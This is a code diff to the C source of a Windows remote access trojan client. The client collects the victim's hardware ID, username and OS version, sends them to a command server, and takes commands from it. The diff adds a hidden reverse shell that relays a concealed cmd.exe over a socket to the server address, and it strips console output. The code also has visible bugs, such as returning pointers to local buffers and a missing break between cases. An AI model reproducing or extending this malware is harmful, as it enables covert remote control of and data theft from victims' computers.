@@ -3,39 +3,56 @@
 #include "ntdll.h"
 #include "iphlpapi.h"
 #include "stdio.h"
+
 #pragma comment(lib, "iphlpapi")
 #pragma comment(lib, "ws2_32")
 #pragma warning(disable : 4996)
 
+#ifndef min
+#define min(a,b) (((a) < (b)) ? (a) : (b))
+#endif
+
+#define ADDRSERVER "127.000.000.001"
+
 SOCKET Socket;
 
-#define CMD_HADSHAKE	0x00
-#define CMD_ONLINE		0x01
-#define CMD_OTVET_OK	0x02
-#define CMD_OTVET_ER	0x03
-#define CMD_SCREEN		0x04
-#define CMD_LOADER		0x05
+#define CMD_HADSHAKE	0
+#define CMD_ONLINE		1
+#define CMD_OTVET_OK	2
+#define CMD_OTVET_ER	3
+#define CMD_SCREEN		4
+#define CMD_LOADER		5
+#define CMD_SHELL		6
 
-struct CLIENTS
+int x1, y1, x2, y2, w, h;
+
+typedef struct CLIENTS
 {
 	SOCKET SOCKET;
 	char USERNAME[100];
 	char OSVER[100];
 	char HWID[100];
-} ;
+} CLIENTS;
 
-struct DLE
+typedef struct DLE
 {
 	char URL[1000];
-} ;
+} DLE;
 
-struct CMDiDATA
+typedef struct BIGSCREEN
+{
+	int w;
+	int h;
+	ULONG ZipSize;
+} BIGSCREEN;
+
+typedef struct CMDiDATA
 {
 	DWORD CMD;
-	char DATA[4000];
-} ;
+	char DATA[1000];
+} CMDiDATA;
 
-void GetHwid(char** hwid)
+char* GetHwid()
 {
 	int CPUInfo[4];
 	PIP_ADAPTER_INFO pAdapterInfo;
@@ -55,36 +72,132 @@ void GetHwid(char** hwid)
 		}
 		pAdapterInfo = pAdapterInfo->Next;
 	} while (pAdapterInfo);
-	*hwid = (char*)realloc(*hwid, 100);
-	wsprintfA(*hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
+	char hwid[100];
+	memset(hwid, 0, sizeof(hwid));
+	wsprintfA(hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
 		CPUInfo[0], CPUInfo[1], CPUInfo[2],
 		CPUInfo[3], mac[0], mac[1],
 		mac[2], mac[3], mac[4],
 		mac[5], mac[6], mac[7]);
+	return hwid;
 }
 
-void GetUsername(char** username)
+char* GetUsername()
 {
+	char username[100];
 	DWORD size = UNLEN;
-	*username = (char*)realloc(*username, UNLEN);
-	GetUserNameA(*username, &size);
+	memset(username, 0, sizeof(username));
+	GetUserNameA(username, &size);
+	return username;
 }
 
-void GetOS(char** os)
+char* GetOS()
 {
+	char os[100];
 	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
-	*os = (char*)realloc(*os, sizeof(DWORD) * 12);
-	wsprintfA(*os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
+	memset(os, 0, sizeof(os));
+	wsprintfA(os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
+	return os;
+}
+
+DWORD WINAPI GETSCREEN(LPVOID param)
+{
+	return 0;
 }
 
 DWORD WINAPI DLEFUNC(LPVOID url)
 {
 	char *urlarrdfile = (char*)url;
-	printf("na4inau ska4ivanie faula: %s\n", urlarrdfile);
 	CMDiDATA indata; //создаем структуру отвечающую за протокол
 	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
 	indata.CMD = CMD_OTVET_OK;
 	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
+	return 0;
+}
+
+DWORD WINAPI RUNSHELL(LPVOID port)
+{
+	SOCKADDR_IN sin;
+	SOCKET shellsock;
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(8080);
+	sin.sin_addr.S_un.S_addr = inet_addr(ADDRSERVER);
+	shellsock = socket(AF_INET, SOCK_STREAM, 0);
+
+	DWORD lpNumberOfBytesRead;
+	SECURITY_ATTRIBUTES secu =
+	{
+		(DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
+	};
+
+	STARTUPINFOA sInfo;
+	PROCESS_INFORMATION pInfo;
+	HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
+	char szBuffer[4096], szCmdPath[MAX_PATH];
+	int i, count = 0;
+	CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);
+	CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);
+	GetEnvironmentVariableA("ComSpec", szCmdPath, sizeof(szCmdPath));
+
+	memset(&sInfo, 0, sizeof(sInfo));
+	memset(&pInfo, 0, sizeof(pInfo));
+	sInfo.cb = sizeof(STARTUPINFOA);
+	sInfo.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
+	sInfo.wShowWindow = SW_HIDE;
+	sInfo.hStdInput = hPipeRead2;
+	sInfo.hStdOutput = hPipeWrite1;
+	sInfo.hStdError = hPipeWrite1;
+	CreateProcessA(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
+
+	while (TRUE)
+	{
+		if (connect(shellsock, (SOCKADDR*)&sin, sizeof(sin)) == 0)
+		{
+			while (TRUE)
+			{
+				Sleep(100);
+				memset(szBuffer, 0, sizeof(szBuffer));
+				PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
+				while (lpNumberOfBytesRead)
+				{
+					Sleep(200);
+					if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) 
+						break;
+					else
+					{
+						send(shellsock, szBuffer, lpNumberOfBytesRead, 0);
+					}
+						
+					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
+				}
+				
+				Sleep(200);
+
+				i = recv(shellsock, szBuffer, sizeof(szBuffer), 0);
+
+				if (shellsock == 0)
+				{
+					count++;
+					if (count > 1) break;
+				}
+
+				if (!strstr(szBuffer, "exit") == 0)
+				{
+					closesocket(shellsock);
+					goto exit;
+				}
+
+				else 
+					WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
+			}
+		}
+		else
+		{
+			Sleep(100);
+		}
+	}
+exit:
+	TerminateProcess(pInfo.hProcess, 0);
 	return 0;
 }
 
@@ -93,9 +206,7 @@ DWORD WINAPI RecvThread(LPVOID param)
 	while (TRUE)
 	{
 		CMDiDATA indata; //создаем структуру отвечающую за протокол
-		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-
-		//recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
+		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 							  //recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
 		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
 		{
 			switch (indata.CMD)
@@ -105,9 +216,18 @@ DWORD WINAPI RecvThread(LPVOID param)
 					DLE dle; //инициализируем структуру DLE
 					memset(&dle, 0, sizeof(DLE)); //очищаем ее
 					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
-					printf("url: %s\n", dle.URL); //напечатаем пришедший урл
 					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
 					break;
+				}
+
+				case CMD_SHELL:
+				{
+					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RUNSHELL, NULL, 0, 0);
+				}
+
+				case CMD_SCREEN:
+				{
+					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GETSCREEN, NULL, 0, 0);
 				}
 				default:
 					break;
@@ -120,36 +240,36 @@ DWORD WINAPI RecvThread(LPVOID param)
 				return 0;
 			}
 			Sleep(1000);
-		}	
+		}
 	}
 	return 0;
 }
 
-//будущая точка входа нашего ратника
-int CALLBACK WinMain(HINSTANCE hInstance,
+int WINAPI WinMain(
+	HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
-	LPSTR lpCmdLine,
-	int nCmdShow)
+	LPSTR     lpCmdLine,
+	int       nShowCmd
+)
 {
-	AllocConsole();
+	HMODULE ntdll = LoadLibraryA("ntdll.dll");
+	pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\
+		GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
+	pRtlCompressBuffer = (fRtlCompressBuffer)\
+		GetProcAddress(ntdll, "RtlCompressBuffer");
 
-	freopen("CONIN$", "r", stdin);
-	freopen("CONOUT$", "w", stdout);
-	freopen("CONOUT$", "w", stderr);
-
-	SetConsoleTitleA("RAT");
-
-	//инициализируем структуры винсока
 	struct WSAData wsaData;
-	WORD DLLVersion = MAKEWORD(2, 1);
-	WSAStartup(DLLVersion, &wsaData);
-start:
 	SOCKADDR_IN ServerAddr;
+	WORD DLLVersion = MAKEWORD(2, 2);
+	WSAStartup(DLLVersion, &wsaData);
+
+start:
+	memset(&ServerAddr, 0, sizeof(ServerAddr));
 	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	ServerAddr.sin_family = AF_INET;
 	//задаем конект на локалхост к восьмидесятому порту
 	ServerAddr.sin_port = htons(80);
-	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	ServerAddr.sin_addr.s_addr = inet_addr(ADDRSERVER);
 	//подключаемся к серверу!!!
 
 	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
@@ -159,28 +279,14 @@ start:
 		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
 		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
 		memset(&client, 0, sizeof(CLIENTS)); //почистим
-		
-		char* hwid = (char*)malloc(0);
-		char* user = (char*)malloc(0);
-		char* os = (char*)malloc(0);
-
-		GetHwid(&hwid);
-		GetUsername(&user);
-		GetOS(&os);
-
-		memcpy(client.HWID, hwid, sizeof(client.HWID));
-		memcpy(client.USERNAME, user, sizeof(client.USERNAME));
-		memcpy(client.OSVER, os, sizeof(client.OSVER));
+		memcpy(client.HWID, GetHwid(), sizeof(client.HWID));
+		memcpy(client.USERNAME, GetUsername(), sizeof(client.USERNAME));
+		memcpy(client.OSVER, GetOS(), sizeof(client.OSVER));
 		indata.CMD = CMD_HADSHAKE;
 		memcpy(indata.DATA, &client, sizeof(CLIENTS));
 		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
-		printf("sended data :: %s %s %s %s\n", client.HWID, client.OSVER, client.USERNAME);
 		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
 		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
-		
-		free(hwid);
-		free(user);
-		free(os);
 	}
 	Sleep(10000);
 	goto start;
